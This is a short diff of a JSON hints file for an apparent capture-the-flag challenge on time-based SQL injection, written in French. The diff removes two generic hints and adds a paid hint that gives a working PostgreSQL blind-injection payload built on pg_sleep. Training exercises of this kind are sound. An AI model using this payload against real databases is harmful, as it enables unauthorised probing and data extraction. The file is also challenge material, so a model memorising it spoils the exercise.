@@ -1,12 +1,7 @@
 [
   {
-    "title": "Indice 1 : Vecteur d'attaque",
-    "cost": 15,
-    "content": "Recherche la documentation officielle et les techniques éprouvées pour exploiter sqli-time-based."
-  },
-  {
-    "title": "Indice 2 : Format du drapeau",
-    "cost": 25,
-    "content": "Le drapeau respecte le format standard : CYBERLAB{...}."
+    "title": "Clause conditionnelle",
+    "cost": 20,
+    "content": "Utilise : ' || (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END) --"
   }
 ]
